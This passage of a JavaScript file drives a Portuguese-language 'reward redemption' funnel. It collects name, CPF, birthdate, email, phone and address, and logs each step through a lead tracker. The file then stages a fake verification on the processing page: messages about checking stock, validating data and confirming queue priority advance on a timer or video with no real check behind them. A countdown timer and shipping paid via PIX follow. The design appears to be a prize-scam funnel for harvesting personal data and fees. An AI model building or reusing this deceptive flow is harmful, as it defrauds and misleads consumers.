        const selected = String(button.getAttribute('data-value') || '').trim();
        if (selected) applySuggestion(selected);
    });

    document.addEventListener('click', (event) => {
        if (!group.contains(event.target)) hide();
    });
}

function initPersonal() {
    setStage('personal');
    trackLead('personal_view', { stage: 'personal' });
    const returnTo = getReturnTarget();

    const form = document.getElementById('personal-form');
    const fullname = document.getElementById('fullname');
    const cpf = document.getElementById('cpf');
    const email = document.getElementById('email');
    const phone = document.getElementById('phone');
    const birthdate = document.getElementById('birthdate');
    const errorBox = document.getElementById('personal-error');

    const personal = loadPersonal();
    if (personal) {
        if (fullname) fullname.value = personal.name || '';
        if (cpf) cpf.value = personal.cpf || '';
        if (email) email.value = personal.email || '';
        if (phone) phone.value = personal.phone || '';
        if (birthdate) birthdate.value = personal.birth || '';
    }

    cpf?.addEventListener('input', () => maskCPF(cpf));
    phone?.addEventListener('input', () => maskPhone(phone));
    birthdate?.addEventListener('input', () => maskDate(birthdate));
    setupEmailAutocomplete(email);

    form?.addEventListener('submit', (event) => {
        event.preventDefault();
        clearInlineError(errorBox);

        const nameValue = fullname?.value.trim() || '';
        const cpfValue = cpf?.value.trim() || '';
        const emailValue = email?.value.trim() || '';
        const phoneValue = phone?.value.trim() || '';
        const birthValue = birthdate?.value.trim() || '';

        if (nameValue.length < 3) {
            showInlineError(errorBox, 'Por favor, digite seu nome completo.');
            return;
        }

        if (!isValidDate(birthValue)) {
            showInlineError(errorBox, 'Digite uma data válida (DD/MM/AAAA).');
            return;
        }

        if (!validateCPF(cpfValue)) {
            showInlineError(errorBox, 'CPF inválido. Verifique os números digitados.');
            return;
        }

        if (!isValidEmail(emailValue)) {
            showInlineError(errorBox, 'Digite um e-mail válido.');
            return;
        }

        if (!isValidPhone(phoneValue)) {
            showInlineError(errorBox, 'Digite um telefone válido com DDD.');
            return;
        }

        savePersonal({
            name: nameValue,
            cpf: cpfValue,
            birth: birthValue,
            email: emailValue,
            phone: phoneValue,
            phoneDigits: phoneValue.replace(/\D/g, '')
        });
        sessionStorage.removeItem(STORAGE_KEYS.directCheckout);
        trackLead('personal_submitted', {
            stage: 'personal',
            personal: loadPersonal()
        });

        if (returnTo === 'checkout' && loadAddress()) {
            sessionStorage.removeItem(STORAGE_KEYS.returnTo);
            setStage('checkout');
            redirect('checkout.html');
            return;
        }

        setStage('cep');
        redirect('endereco.html');
    });

    focusFirstControl(form);
}

function initCep() {
    if (!requirePersonal()) return;
    setStage('cep');
    trackLead('cep_view', { stage: 'cep' });
    const returnTo = getReturnTarget();

    const cepInput = document.getElementById('cep-input');
    const errorBox = document.getElementById('cep-error');
    const btnBuscar = document.getElementById('btn-buscar-cep');
    const loadingRow = document.getElementById('cep-loading');
    const addressResult = document.getElementById('address-result');
    const addrStreet = document.getElementById('addr-street');
    const addrCity = document.getElementById('addr-city');
    const addressExtra = document.getElementById('address-extra');
    const addrNumber = document.getElementById('addr-number');
    const addrComplement = document.getElementById('addr-complement');
    const noNumber = document.getElementById('no-number');
    const noComplement = document.getElementById('no-complement');
    const addrReference = document.getElementById('addr-reference');
    const freightBox = document.getElementById('freight-calculation');
    const btnConfirm = document.getElementById('btn-confirm-address');

    const collectCepAddressExtra = () => ({
        number: noNumber?.checked ? '' : (addrNumber?.value || '').trim(),
        complement: noComplement?.checked ? '' : (addrComplement?.value || '').trim(),
        reference: (addrReference?.value || '').trim(),
        noNumber: !!noNumber?.checked,
        noComplement: !!noComplement?.checked
    });

    const setInputState = (input, disabled) => {
        if (!input) return;
        input.disabled = disabled;
        input.classList.toggle('input-dim', disabled);
    };

    const syncNoNumberState = () => {
        const checked = !!noNumber?.checked;
        if (checked && addrNumber) addrNumber.value = '';
        setInputState(addrNumber, checked);
    };

    const syncNoComplementState = () => {
        const checked = !!noComplement?.checked;
        if (checked && addrComplement) addrComplement.value = '';
        setInputState(addrComplement, checked);
    };

    const applyCepAddressExtra = (extra) => {
        if (noNumber) noNumber.checked = !!extra?.noNumber;
        if (noComplement) noComplement.checked = !!extra?.noComplement;
        if (addrNumber) addrNumber.value = extra?.noNumber ? '' : (extra?.number || '');
        if (addrComplement) addrComplement.value = extra?.noComplement ? '' : (extra?.complement || '');
        if (addrReference) addrReference.value = extra?.reference || '';
        setInputState(addrNumber, !!extra?.noNumber);
        setInputState(addrComplement, !!extra?.noComplement);
    };

    const formatStreetPreview = (streetLine) => {
        const baseStreet = String(streetLine || '').trim() || 'Rua nao informada';
        const number = (addrNumber?.value || '').trim();
        const numberLabel = noNumber?.checked ? 's/n' : number;
        return numberLabel ? `${baseStreet}, ${numberLabel}` : baseStreet;
    };

    const updateAddressPreview = (streetLine, cityLine) => {
        if (addrStreet) addrStreet.innerText = formatStreetPreview(streetLine);
        if (addrCity) addrCity.innerText = cityLine || 'Cidade nao informada';
    };

    const savedAddress = loadAddress();
    if (savedAddress && cepInput) {
        cepInput.value = savedAddress.cep || '';
        applyCepAddressExtra(loadAddressExtra() || {});
        updateAddressPreview(savedAddress.streetLine, savedAddress.cityLine);
        setHidden(addressResult, false);
        setHidden(addressExtra, false);
        setHidden(freightBox, false);
        btnBuscar?.classList.add('hidden');
    }

    cepInput?.addEventListener('input', () => {
        maskCep(cepInput);
        resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loadingRow);
        setHidden(addressExtra, true);
    });

    const persistCepAddressExtra = () => {
        clearInlineError(errorBox);
        saveAddressExtra(collectCepAddressExtra());
        const currentAddress = loadAddress();
        updateAddressPreview(currentAddress?.streetLine, currentAddress?.cityLine);
    };

    [addrNumber, addrComplement, addrReference].forEach((input) => {
        input?.addEventListener('input', () => {
            persistCepAddressExtra();
        });
    });

    noNumber?.addEventListener('change', () => {
        syncNoNumberState();
        persistCepAddressExtra();
    });

    noComplement?.addEventListener('change', () => {
        syncNoComplementState();
        persistCepAddressExtra();
    });

    const fetchCepData = async (rawCep, retry = 1) => {
        let attempt = 0;
        while (attempt <= retry) {
            try {
                const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`, { cache: 'no-store' });
                if (!response.ok) throw new Error('CEP nao encontrado');
                return await response.json();
            } catch (error) {
                if (attempt >= retry) throw error;
                await new Promise((resolve) => setTimeout(resolve, 450 * (attempt + 1)));
                attempt += 1;
            }
        }
        throw new Error('CEP nao encontrado');
    };

    btnBuscar?.addEventListener('click', async () => {
        if (!cepInput) return;
        clearInlineError(errorBox);

        const rawCep = cepInput.value.replace(/\D/g, '');
        if (rawCep.length !== 8) {
            showInlineError(errorBox, 'Por favor, digite um CEP válido.');
            return;
        }

        const minDelayMs = 1200;
        const startTime = Date.now();

        btnBuscar.innerText = 'Consultando...';
        btnBuscar.disabled = true;
        setHidden(loadingRow, false);

        try {
            const data = await fetchCepData(rawCep, 1);
            const street = (data.street || '').trim();
            const neighborhood = (data.neighborhood || '').trim();
            const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
            const city = (data.city || 'Cidade não informada').trim();
            const stateUf = (data.state || '').trim();
            const cityLine = stateUf ? `${city} - ${stateUf}` : city;

            updateAddressPreview(streetLine, cityLine);

            saveAddress({
                streetLine,
                cityLine,
                cep: formatCep(rawCep),
                street,
                neighborhood,
                city,
                state: stateUf
            });
            trackLead('cep_confirmed', {
                stage: 'cep',
                address: loadAddress()
            });

            const elapsed = Date.now() - startTime;
            const remaining = Math.max(0, minDelayMs - elapsed);

            setTimeout(() => {
                setHidden(loadingRow, true);
                setHidden(addressResult, false);
                setHidden(addressExtra, false);
                setHidden(freightBox, false);
                btnBuscar.classList.add('hidden');
                btnBuscar.innerText = 'Verificar disponibilidade';
                btnBuscar.disabled = false;
            }, remaining);
        } catch (error) {
            const elapsed = Date.now() - startTime;
            const remaining = Math.max(0, minDelayMs - elapsed);

            setTimeout(() => {
                setHidden(loadingRow, true);
                showInlineError(errorBox, 'CEP nao encontrado ou servico indisponivel. Verifique e tente novamente.');
                btnBuscar.innerText = 'Verificar disponibilidade';
                btnBuscar.disabled = false;
            }, remaining);
        }
    });

    btnConfirm?.addEventListener('click', () => {
        if (!loadAddress()) {
            showInlineError(errorBox, 'Confirme o CEP para continuar.');
            return;
        }
        const extra = collectCepAddressExtra();
        if (!extra.noNumber && !extra.number) {
            showInlineError(errorBox, 'Informe o numero do endereco para continuar.');
            addrNumber?.focus();
            return;
        }
        if (!extra.noComplement && !extra.complement) {
            showInlineError(errorBox, 'Informe o complemento do endereco para continuar.');
            addrComplement?.focus();
            return;
        }
        saveAddressExtra(extra);
        trackLead('address_extra_confirmed', {
            stage: 'cep',
            extra
        });
        if (returnTo === 'checkout') {
            sessionStorage.removeItem(STORAGE_KEYS.returnTo);
            setStage('checkout');
            redirect('checkout.html');
            return;
        }
        setStage('processing');
        redirect('processando.html');
    });

    focusFirstControl(document.querySelector('.step'));
}

function initProcessing() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('processing');
    trackLead('processing_view', { stage: 'processing' });

    const textEl = document.getElementById('processing-text');
    const videoEl = document.getElementById('vsl-video');
    const progressEl = document.getElementById('processing-progress');
    const progressLabelEl = document.getElementById('processing-progress-label');
    const progressSegmentEls = Array.from(document.querySelectorAll('.processing-segment i'));
    const verifiedEl = document.getElementById('processing-verified');
    const overlayEl = document.getElementById('vsl-audio-overlay');
    const overlayBtn = document.getElementById('vsl-audio-btn');
    const loadingTexts = [
        'Verificando estoque da bag na sua região...',
        'Validando seus dados com segurança...',
        'Confirmando sua prioridade na fila...',
        'Liberando o acesso ao resgate...'
    ];
    const preferredVolume = 0.65;

    let verificationTimer = null;
    let finishTimer = null;
    let progressTimer = null;
    let autoplayGuardTimer = null;
    let timelineStarted = false;
    let finishTriggered = false;

    const setProgress = (ratio) => {
        const clamped = Math.max(0, Math.min(1, Number(ratio) || 0));
        const total = progressSegmentEls.length || 1;

        progressSegmentEls.forEach((segment, index) => {
            const start = index / total;
            const end = (index + 1) / total;
            let pct = 0;
            if (clamped >= end) pct = 1;
            else if (clamped > start) pct = (clamped - start) / (end - start);
            segment.style.width = `${Math.round(pct * 100)}%`;
        });

        if (progressLabelEl) {
            progressLabelEl.textContent = `${Math.round(clamped * 100)}%`;
        }
    };

    const startProgressTimer = (durationMs) => {
        if (progressTimer) clearInterval(progressTimer);
        const startedAt = Date.now();
        progressTimer = setInterval(() => {
            const elapsed = Date.now() - startedAt;
            setProgress(Math.min(1, elapsed / durationMs));
        }, 140);
    };

    const clearProgressTimer = () => {
        if (progressTimer) {
            clearInterval(progressTimer);
            progressTimer = null;
        }
    };

    const clearAutoplayGuard = () => {
        if (autoplayGuardTimer) {
            clearInterval(autoplayGuardTimer);
            autoplayGuardTimer = null;
        }
    };

    const showOverlay = () => {
        if (!overlayEl) return;
        overlayEl.classList.remove('hidden');
        overlayEl.setAttribute('aria-hidden', 'false');
    };

    const hideOverlay = () => {
        if (!overlayEl) return;
        overlayEl.classList.add('hidden');
        overlayEl.setAttribute('aria-hidden', 'true');
    };

    const updateText = (txt) => {
        if (!textEl) return;
        textEl.style.opacity = 0;
        setTimeout(() => {
            textEl.innerText = txt;
            textEl.style.opacity = 1;
        }, 200);
    };

    const startTimeline = (durationMs, autoFinish = true) => {
        if (timelineStarted) return;
        timelineStarted = true;

        const stepInterval = Math.max(800, durationMs / loadingTexts.length);
        loadingTexts.forEach((txt, index) => {
            setTimeout(() => updateText(txt), index * stepInterval);
        });

        if (autoFinish) {
            startProgressTimer(durationMs);
            verificationTimer = setTimeout(() => finishVerification(), durationMs);
        }
    };

    const finishVerification = () => {
        if (finishTriggered) return;
        finishTriggered = true;

        if (verificationTimer) {
            clearTimeout(verificationTimer);
        }
        clearProgressTimer();
        clearAutoplayGuard();
        setProgress(1);

        finishTimer = setTimeout(() => {
            if (progressEl) progressEl.classList.add('hidden');
            if (verifiedEl) {
                verifiedEl.classList.remove('hidden');
                verifiedEl.setAttribute('aria-hidden', 'false');
            }
            updateText('Verificação concluída.');

            setTimeout(() => {
                markVslCompleted();
                setStage('success');
                redirect('sucesso.html');
            }, 900);
        }, 2000);
    };

    if (videoEl) {
        const applyPreferredAudio = () => {
            videoEl.defaultMuted = false;
            videoEl.muted = false;
            videoEl.volume = preferredVolume;
        };

        const syncVideoProgress = () => {
            if (!Number.isFinite(videoEl.duration) || videoEl.duration <= 0) return;
            setProgress(videoEl.currentTime / videoEl.duration);
        };

        const safeStart = () => {
            const durationMs = Number.isFinite(videoEl.duration) && videoEl.duration > 0
                ? videoEl.duration * 1000
                : 30000;
            startTimeline(durationMs, false);
            syncVideoProgress();
        };

        videoEl.addEventListener('loadedmetadata', safeStart);
        videoEl.addEventListener('timeupdate', syncVideoProgress);
        if (videoEl.readyState >= 1) safeStart();

        videoEl.addEventListener('ended', () => {
            setProgress(1);
            finishVerification();
        });

        videoEl.autoplay = true;
        videoEl.playsInline = true;
        videoEl.setAttribute('playsinline', '');
        videoEl.setAttribute('webkit-playsinline', '');
        videoEl.preload = 'auto';
        applyPreferredAudio();

        const tryPlay = () => {
            applyPreferredAudio();
            const playPromise = videoEl.play();
            if (playPromise && typeof playPromise.catch === 'function') {
                playPromise.catch(() => {
                    showOverlay();
                    safeStart();
                });
            }
        };

        const startAutoplayGuard = () => {
            clearAutoplayGuard();
            autoplayGuardTimer = setInterval(() => {
                if (finishTriggered) {
                    clearAutoplayGuard();
                    return;
                }
                applyPreferredAudio();
                if (videoEl.paused) {
                    showOverlay();
                    tryPlay();
                } else {
                    hideOverlay();
                    clearAutoplayGuard();
                }
            }, 350);
        };

        const unlockAudio = () => {
            applyPreferredAudio();
            tryPlay();
            document.removeEventListener('click', unlockAudio);
            document.removeEventListener('touchstart', unlockAudio);
            document.removeEventListener('pointerdown', unlockAudio);
        };

        document.addEventListener('click', unlockAudio, { once: true });
        document.addEventListener('touchstart', unlockAudio, { once: true });
        document.addEventListener('pointerdown', unlockAudio, { once: true });

        videoEl.addEventListener('play', hideOverlay);
        videoEl.addEventListener('playing', hideOverlay);
        videoEl.addEventListener('pause', () => {
            if (!finishTriggered) showOverlay();
        });

        overlayBtn?.addEventListener('click', () => {
            applyPreferredAudio();
            tryPlay();
        });

        startAutoplayGuard();
        tryPlay();
    } else {
        startTimeline(30000, true);
    }
}

function initSuccess() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('success');
    trackLead('success_view', { stage: 'success' });

    const personal = loadPersonal();
    const rewardCards = Array.from(document.querySelectorAll('.success-reward-card'));
    const leadName = document.getElementById('lead-name');
    const timer = document.getElementById('timer');
    const btnCheckout = document.getElementById('btn-checkout');
    let selectedReward = loadRewardSelection();

    if (leadName && personal?.name) {
        const firstName = personal.name.trim().split(/\s+/)[0];
        leadName.textContent = firstName || personal.name;
    }

    const applyRewardState = (reward) => {
        rewardCards.forEach((card) => {
            const isSelected = reward?.id === card.dataset.rewardId;
            card.classList.toggle('is-selected', isSelected);
            card.setAttribute('aria-pressed', isSelected ? 'true' : 'false');
        });
        if (btnCheckout) btnCheckout.disabled = !reward;
    };

    if (!selectedReward) {
        clearRewardSelection();
    }
    applyRewardState(selectedReward);

    rewardCards.forEach((card) => {
        card.addEventListener('click', () => {
            const previousRewardId = String(selectedReward?.id || '').trim();
            const reward = resolveRewardSelection({
                id: card.dataset.rewardId,
                selectedAt: Date.now()
            });
            if (!reward) return;
            if (previousRewardId && previousRewardId !== reward.id) {
                localStorage.removeItem(STORAGE_KEYS.pix);
            }
            saveRewardSelection(reward);
            selectedReward = loadRewardSelection();
            applyRewardState(selectedReward);
            trackLead('reward_selected', {
                stage: 'success',
                reward: selectedReward,
                amount: getRewardExtraPrice(selectedReward)
            });
        });
    });

    startTimer(300, timer);

    btnCheckout?.addEventListener('click', () => {
        const reward = loadRewardSelection();
        if (!reward) {
            showToast('Escolha 1 item para continuar.', 'error');
            return;
        }
        trackLead('success_cta', {
            stage: 'success',
            reward,
            amount: getRewardExtraPrice(reward)
        });
        setStage('checkout');
        redirect('checkout.html');
    });
}

function initCheckout() {
    const directCheckout = isDirectCheckoutMode();
    if (!directCheckout && !requirePersonal()) return;
    if (!directCheckout && !requireAddress()) return;
    const reward = loadRewardSelection();
    if (!reward) {
        setStage('success');
        redirect('sucesso.html');
        return;
    }

    setStage('checkout');
    trackLead('checkout_view', {
        stage: 'checkout',
        reward,
        amount: getRewardExtraPrice(reward)
    });
    const personal = loadPersonal();
    let address = loadAddress() || {};
    let shipping = loadShipping();
    const rewardExtraPrice = getRewardExtraPrice(reward);
    const hasRewardExtra = rewardExtraPrice > 0;
    const checkoutCopy = getRewardCheckoutCopy(reward);
    const checkoutParams = new URLSearchParams(window.location.search || '');
    const forceFreteSelection = checkoutParams.get('forceFrete') === '1';
    if (forceFreteSelection) {
        localStorage.removeItem(STORAGE_KEYS.shipping);
        shipping = null;
        checkoutParams.delete('forceFrete');
        const nextQuery = checkoutParams.toString();
        const nextUrl = `${window.location.pathname}${nextQuery ? `?${nextQuery}` : ''}${window.location.hash || ''}`;
        try {
            history.replaceState(history.state || {}, '', nextUrl);
        } catch (_error) {
            // Ignore browser-specific history restrictions.
        }
    }
    const checkoutNeutralBump = {
        selected: false,
        price: 0,
        title: 'Seguro Bag'
    };
    saveBump(checkoutNeutralBump);

    const summaryName = document.getElementById('summary-name');
    const summaryCpf = document.getElementById('summary-cpf');
    const summaryBirth = document.getElementById('summary-birth');
    const summaryAddress = document.getElementById('summary-address');
    const summaryCep = document.getElementById('summary-cep');
    const summaryBlock = document.getElementById('summary-block');
    const freightForm = document.getElementById('freight-form');
    const checkoutCep = document.getElementById('checkout-cep');
    const btnCalcFreight = document.getElementById('btn-calc-freight');
    const btnVerifyFreight = document.getElementById('btn-verify-freight');
    const freightLoading = document.getElementById('freight-loading');
    const freightAddress = document.getElementById('freight-address');
    const freightStreet = document.getElementById('freight-street');
    const freightCity = document.getElementById('freight-city');
    const btnEditCep = document.getElementById('btn-edit-cep');
    const freightDetails = document.getElementById('freight-details');
    const addrNumber = document.getElementById('addr-number');
    const noNumber = document.getElementById('no-number');
    const addrComplement = document.getElementById('addr-complement');
    const noComplement = document.getElementById('no-complement');
    const addrReference = document.getElementById('addr-reference');
    const freightOptions = document.getElementById('freight-options');
    const freightHint = document.getElementById('freight-hint');
    const shippingTotal = document.getElementById('shipping-total');
    const rewardExtraTotal = document.getElementById('reward-extra-total');
    const rewardExtraLabel = document.getElementById('reward-extra-label');
    const rewardExtraPriceNode = document.getElementById('reward-extra-price');
    const checkoutGrandTotal = document.getElementById('checkout-grand-total');
    const checkoutGrandTotalPrice = document.getElementById('checkout-grand-total-price');
    const btnFinish = document.getElementById('btn-finish');
    const couponBanner = document.getElementById('coupon-banner');
    const btnEditData = document.querySelector('.action-stack a[href^="dados"]');
    const btnEditAddress = document.querySelector('.action-stack a[href^="endereco"]');
    const freightCard = document.querySelector('.freight-card');
    const checkoutHeadlineTitle = document.getElementById('checkout-headline-title');
    const checkoutHeadlineSubtitle = document.getElementById('checkout-headline-subtitle');
    const checkoutNextStep = document.getElementById('checkout-next-step');
    const checkoutSelectedShipping = document.getElementById('checkout-selected-shipping');
    if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');

    if (checkoutHeadlineTitle) checkoutHeadlineTitle.textContent = checkoutCopy.title;
    if (checkoutHeadlineSubtitle) checkoutHeadlineSubtitle.textContent = checkoutCopy.subtitle;

    let orderBumpHintEnabled = true;
    let checkoutSubmitting = false;

    const formatShippingLabel = (option) => {
        if (!option) return 'Frete ainda nao selecionado.';
        const currentPrice = formatCurrency(option.price || 0);
        const originalPrice = Number(option.originalPrice || 0);
        if (originalPrice > Number(option.price || 0)) {
            return `${option.name} - de ${formatCurrency(originalPrice)} por ${currentPrice}`;
        }
        return `${option.name} - ${currentPrice}`;
    };

    const formatShippingPriceHtml = (option) => {
        const currentPrice = Number(option?.price || 0);
        const originalPrice = Number(option?.originalPrice || 0);
        if (originalPrice > currentPrice) {
            return `<span class="price-old">${formatCurrency(originalPrice)}</span><span class="price-new">${formatCurrency(currentPrice)}</span>`;
        }
        return formatCurrency(currentPrice);
    };

    const updateCheckoutTotals = (selectedShipping = shipping) => {
        if (shippingTotal) {
            if (selectedShipping) {
                const strong = shippingTotal.querySelector('strong');
                if (strong) strong.innerHTML = formatShippingPriceHtml(selectedShipping);
                setHidden(shippingTotal, false);
            } else {
                setHidden(shippingTotal, true);
            }
        }

        if (rewardExtraTotal) {
            const showRewardExtra = hasRewardExtra;
            if (showRewardExtra) {
                if (rewardExtraLabel) rewardExtraLabel.textContent = `Adicional ${reward.name}`;
                if (rewardExtraPriceNode) rewardExtraPriceNode.textContent = formatCurrency(rewardExtraPrice);
            }
            setHidden(rewardExtraTotal, !showRewardExtra);
        }

        if (checkoutGrandTotal) {
            const showGrandTotal = hasRewardExtra && !!selectedShipping;
            if (showGrandTotal && checkoutGrandTotalPrice) {
                const total = Number((Number(selectedShipping?.price || 0) + rewardExtraPrice).toFixed(2));
                checkoutGrandTotalPrice.textContent = formatCurrency(total);
            }
            setHidden(checkoutGrandTotal, !showGrandTotal);
        }
    };

    const updateCheckoutActionPanel = () => {
        if (!btnFinish) return;
        btnFinish.classList.remove('hidden');
        const cepDigits = String(checkoutCep?.value || '').replace(/\D/g, '');
        const hasValidCep = cepDigits.length === 8;
        const hasShipping = !!shipping;

        let flowStep = 'cep';
        if (hasShipping) {
            flowStep = 'final';
        } else if (hasValidCep) {
            flowStep = 'frete';
        }

        if (flowStep === 'cep') {
            if (checkoutNextStep) checkoutNextStep.textContent = 'Informe seu CEP para liberar as opcoes de frete.';
        } else if (flowStep === 'frete') {
            if (checkoutNextStep) checkoutNextStep.textContent = 'Escolha o frete ideal para continuar para a proxima etapa.';
        } else if (checkoutNextStep) {
            checkoutNextStep.textContent = orderBumpHintEnabled
                ? 'Frete selecionado. Agora voce segue para a proxima etapa.'
                : 'Frete selecionado. Agora voce segue direto para o pagamento PIX.';
        }

        if (checkoutSelectedShipping) {
            checkoutSelectedShipping.textContent = formatShippingLabel(shipping);
        }

        btnFinish.disabled = checkoutSubmitting;
        btnFinish.classList.toggle('btn-primary--blocked', !hasShipping && !checkoutSubmitting);
        if (checkoutSubmitting) {
            btnFinish.textContent = 'Processando...';
            return;
        }
        btnFinish.textContent = hasShipping
            ? checkoutCopy.cta
            : 'Selecione um frete para continuar';
    };

    const coupon = loadCoupon();
    if (couponBanner && (coupon?.amountOff || coupon?.discount)) {
        const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
        couponBanner.classList.remove('hidden');
        couponBanner.innerHTML = `
            <strong>Cupom aplicado:</strong> ${coupon.code || 'FRETE5'}
            <span>R$ ${amountOff.toFixed(2).replace('.', ',')} de desconto no frete do seu resgate</span>
        `;
    }

    const personalMissing =
        !personal || !personal.name || !personal.cpf || !personal.birth || !personal.email || !personal.phone;

    if (directCheckout && personalMissing) {
        if (summaryBlock) summaryBlock.classList.add('hidden');
        if (btnEditData) btnEditData.classList.add('hidden');
        if (btnEditAddress) btnEditAddress.classList.add('hidden');
    }

    if (summaryName) summaryName.textContent = personal?.name || '-';
    if (summaryCpf) summaryCpf.textContent = personal?.cpf || '-';
    if (summaryBirth) summaryBirth.textContent = personal?.birth || '-';
    const formatSummaryAddress = () => {
        const base = address?.streetLine || '-';
        const city = address?.cityLine || '-';
        const extra = loadAddressExtra();
        const numberValue = (extra?.number || '').trim();
        const numberText = extra?.noNumber ? 's/n' : numberValue;
        const streetWithNumber = numberText ? `${base}, ${numberText}` : base;
        return `${streetWithNumber} · ${city}`;
    };

    const updateSummaryAddress = () => {
        if (!summaryAddress) return;
        summaryAddress.textContent = formatSummaryAddress();
    };

    updateSummaryAddress();
    if (summaryCep) summaryCep.textContent = address?.cep || '-';

    if (checkoutCep) {
        checkoutCep.value = address?.cep || '';
        checkoutCep.addEventListener('input', () => {
            maskCep(checkoutCep);
            updateCheckoutActionPanel();
        });
    }

    if (shipping) {
        shipping = applyCouponToShipping(shipping);
        if (!isShippingSelectionComplete(shipping)) {
            localStorage.removeItem(STORAGE_KEYS.shipping);
            shipping = null;
        }
    }

    const orderBumpEnabledPromise = isOrderBumpEnabled()
        .then((enabled) => {
            orderBumpHintEnabled = enabled !== false;
            updateCheckoutActionPanel();
            return orderBumpHintEnabled;
        })
        .catch(() => orderBumpHintEnabled);

    let cepLookupTimer = null;
    const getCepDigits = (value) => String(value || '').replace(/\D/g, '');
    const findDefaultShippingOption = (options = []) => {
        if (!Array.isArray(options) || !options.length) return null;
        const byId = options.find((opt) => String(opt?.id || '').trim() === 'padrao');
        if (byId) return byId;
        const byBasePrice = options.find((opt) => {
            const basePrice = Number(opt?.originalPrice || opt?.basePrice || opt?.price || 0);
            return Math.abs(basePrice - 25.9) < 0.001;
        });
        if (byBasePrice) return byBasePrice;
        return options[0] || null;
    };
    const hasResolvedAddressForCep = (rawCep) => {
        const savedCep = getCepDigits(address?.cep || '');
        const hasStreet = !!String(address?.street || address?.streetLine || '').trim();
        const hasCity = !!String(address?.city || address?.cityLine || '').trim();
        return rawCep && savedCep === rawCep && hasStreet && hasCity;
    };

    const openFreightOptions = (rawCep, shouldTrack = true) => {
        const options = buildShippingOptions(rawCep);
        cachedOptions = options;
        if (!cachedSelectedId || !options.some((opt) => opt.id === cachedSelectedId)) {
            cachedSelectedId = null;
        }
        showFreightSelection();
        const selected = cachedSelectedId ? options.find((opt) => opt.id === cachedSelectedId) : null;
        if (selected) {
            selectShipping(selected, options, { autoRestore: true, track: false });
        } else {
            const defaultOption = findDefaultShippingOption(options);
            if (defaultOption) {
                selectShipping(defaultOption, options, { autoDefault: true, track: false });
            }
        }
        if (shouldTrack) {
            trackLead('frete_options_shown', { stage: 'checkout' });
        }
    };

    const handleCepAutoLookup = () => {
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) return;

        if (summaryCep) summaryCep.textContent = formatCep(rawCep);
        if (freightLoading) setHidden(freightLoading, false);

        fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`)
            .then((res) => {
                if (!res.ok) throw new Error('CEP não encontrado');
                return res.json();
            })
            .then((data) => {
                const street = (data.street || '').trim();
                const neighborhood = (data.neighborhood || '').trim();
                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
                const city = (data.city || 'Cidade não informada').trim();
                const stateUf = (data.state || '').trim();
                const cityLine = stateUf ? `${city} - ${stateUf}` : city;

                const updatedAddress = {
                    ...(address || {}),
                    streetLine,
                    cityLine,
                    cep: formatCep(rawCep),
                    street,
                    neighborhood,
                    city,
                    state: stateUf
                };

                saveAddress(updatedAddress);
                address = updatedAddress;
                updateSummaryAddress();
                updateFreightAddress(updatedAddress);
                if (!shipping) {
                    openFreightOptions(rawCep, false);
                }
            })
            .catch(() => {
                showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
            })
            .finally(() => {
                if (freightLoading) setHidden(freightLoading, true);
            });
    };

    checkoutCep?.addEventListener('input', () => {
        if (cepLookupTimer) clearTimeout(cepLookupTimer);
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) return;
        cepLookupTimer = setTimeout(handleCepAutoLookup, 450);
    });

    btnEditCep?.addEventListener('click', () => {
        if (!checkoutCep) return;
        checkoutCep.focus();
        checkoutCep.select();
        checkoutCep.scrollIntoView({ behavior: 'smooth', block: 'center' });
    });

    let cachedOptions = null;
    let cachedSelectedId = null;

    const isExtraValid = () => {
        const numberOk = !!(noNumber?.checked || (addrNumber?.value || '').trim().length);
        const complementOk = !!(noComplement?.checked || (addrComplement?.value || '').trim().length);
        return numberOk && complementOk;
    };

    const renderOptions = (options, selectedId) => {
        if (!freightOptions) return;
        freightOptions.innerHTML = '';
        options.forEach((opt) => {
            const hasDiscount = Number(opt.originalPrice || 0) > Number(opt.price || 0);
            const priceHtml = hasDiscount
                ? `<span class="price-old">${formatCurrency(opt.originalPrice)}</span><span class="price-new">${formatCurrency(opt.price)}</span>`
                : `${formatCurrency(opt.price)}`;
            const label = document.createElement('label');
            label.className = 'freight-option';
            if (opt.id === selectedId) label.classList.add('freight-option--active');
            label.innerHTML = `
                <input type="radio" name="shipping" value="${opt.id}" ${opt.id === selectedId ? 'checked' : ''}>
                <div class="freight-option__main">
                    <div class="freight-option__title">${opt.name}</div>
                    <div class="freight-option__eta">${opt.eta}</div>
                </div>
                <div class="freight-option__price">${priceHtml}</div>
            `;
            label.addEventListener('click', () => {
                selectShipping(opt, options);
            });
            freightOptions.appendChild(label);
        });
    };

    const showFreightSelection = () => {
        if (!cachedOptions || !freightOptions) return;
        renderOptions(cachedOptions, cachedSelectedId);
        setHidden(freightOptions, false);
        setHidden(freightHint, false);
    };

    const updateFreightAddress = (addr) => {
        if (!freightAddress) return;
        if (freightStreet) freightStreet.textContent = addr?.streetLine || 'Rua não informada';
        if (freightCity) freightCity.textContent = addr?.cityLine || 'Cidade não informada';
        setHidden(freightAddress, false);
    };

    const hydrateExtraAddress = () => {
        const extra = loadAddressExtra();
        if (addrNumber) addrNumber.value = extra?.number || '';
        if (addrComplement) addrComplement.value = extra?.complement || '';
        if (addrReference) addrReference.value = extra?.reference || '';
        if (noNumber) noNumber.checked = !!extra?.noNumber;
        if (noComplement) noComplement.checked = !!extra?.noComplement;

        if (noNumber && addrNumber) {
            addrNumber.disabled = noNumber.checked;
            addrNumber.classList.toggle('input-dim', noNumber.checked);
        }
        if (noComplement && addrComplement) {
            addrComplement.disabled = noComplement.checked;
            addrComplement.classList.toggle('input-dim', noComplement.checked);
        }
    };

    let extraBound = false;
    const bindExtraAddress = () => {
        if (extraBound) return;
        extraBound = true;
        if (noNumber && addrNumber) {
            noNumber.addEventListener('change', () => {
                addrNumber.disabled = noNumber.checked;
